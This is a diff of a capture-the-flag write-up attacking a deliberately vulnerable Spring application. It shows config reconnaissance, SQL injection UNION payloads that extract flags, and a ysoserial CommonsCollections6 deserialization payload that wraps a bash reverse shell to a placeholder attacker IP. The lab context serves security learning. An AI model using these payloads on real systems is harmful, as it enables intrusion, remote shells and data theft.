@@ -15,15 +15,15 @@ After downloading task files and unzipping them, we explore the codebase a bit s
 ### pom.xml
 Exploring this file we discovered the app is using spring framework, version 2.7.18, h2database and commons collections 3.2.2, the last two will be useful later.
 ### application.properties (/src/main/resources/application.properties)
-Here we discovered that there are only two endpoints excluded from public access namely `heapdump, threaddump` and all other are exposed.
+Here we discovered that there are only two endpoints excluded from public access namely `heapdump, threaddump` and all other are exposed publicly (confirmed in a different file).
 ```Java
 management.endpoints.web.exposure.include=*
 management.endpoints.web.exposure.exclude=heapdump,threaddump
 management.endpoint.health.show-details=always
 ```
-Another notable setting here is that the DB is kept in memory:
+<!-- Another notable setting here is that the DB is kept in memory:
 `spring.datasource.url=jdbc:h2:mem:ironhold;DB_CLOSE_DELAY=-1`,
-which should not reach production.
+which should not reach production. -->
 
 One can also notice here that password to account kiosk is under variable name app.kiosk.pw,
 for warden account is app.warden.password and flags are stored in app.flag{1,3}.secret.
@@ -32,8 +32,7 @@ From this file we can see that logging level is always set to info.
 **Next, we start reading over the code.**
 ### Starting with src/main/java/com/ironhold/
 We used `grep -ri pass .` to see if there were any passwords left hardcoded into the code.
-Discovering a lookup account in *config/DataAccessConfig.Java*, whose credentials turned out useless based on the comment in the `provisionLookupAccount()` function comment stating it has only read permissions. 
-
+Discovering a lookup account in *config/DataAccessConfig.Java*, whose credentials turned out useless to us, as we logged in under a different account and the lookup account is signed in the DB.
 In the file */seed/DataSeeder.Java* we discovered RNG instantiated with seed 42, names for officers and password:
 ```Java
 String fillerHash = passwordEncoder.encode("<REDACTED>");
@@ -104,7 +103,7 @@ Using the knowledge of the column names from the code above, we crafter a payloa
 `' UNION SELECT id, name, block FROM inmates WHERE id=7 -- - `
 ![Alt text](./img/sqli_poc.png)
 This turned out nicely. Next there were two possibilities of getting another flag.
-Firstly, from the database update above we noticed that there is a database named CASE_FILES with columns id, summary, title (can be viewed in the *model/CaseFile.Java*). So, using analogous query as for the PoC we obtained another flag `' UNION SELECT id, summary, title FORM CASE_FILES -- - '`.
+Firstly, from the database update above we noticed that there is a table named CASE_FILES with columns id, summary, title (can be viewed in the *model/CaseFile.Java*). So, using analogous query as for the PoC we obtained another flag `' UNION SELECT id, summary, title FROM CASE_FILES -- - '`.
 ![Alt text](./img/sqli_flag_redacted.png)
 Secondly, we could view the h2 [documentation](https://h2database.com/html/systemtables.html#information_schema_table_privileges) and enumerate table name and grantee
 `' UNION SELECT 1, TABLE_NAME, GRANTEE FROM INFORMATION_SCHEMA.TABLE_PRIVILEGES -- - `
@@ -141,7 +140,7 @@ curl -s -X POST http://<TARGET_IP>:8080/admin/import --cookie "JSESSIONID=$COOKI
 ![Alt text](./img/serialization_poc.png)
 This command returns Batch accepted, so we know it works.
 
-From the *pom.xml* we read at the beginning we know, that the service uses obsolete version of CommonsCollections 3.2.2. using [ysoserial](https://github.com/frohoff/ysoserial) CommonsCollections6, we craft a serialized payload. Ysoserial splits the payload on space character, so we need to bypass this.
+From the *pom.xml* we read at the beginning we know, that the service uses obsolete version of CommonsCollections [3.2,3.2.2) using [ysoserial](https://github.com/frohoff/ysoserial) CommonsCollections6, we craft a serialized payload. Ysoserial tokenizes the command and shell syntax such as pipes/redirection is not automatically converted, so we need to bypass this.
 ```bash
 shell=$(echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' | base64) # bypass space splitting
 payload=$(java --add-opens java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections6 "bash -c {echo,$shell}|{base64,-d}|{bash,-i}" | base64 -w0)
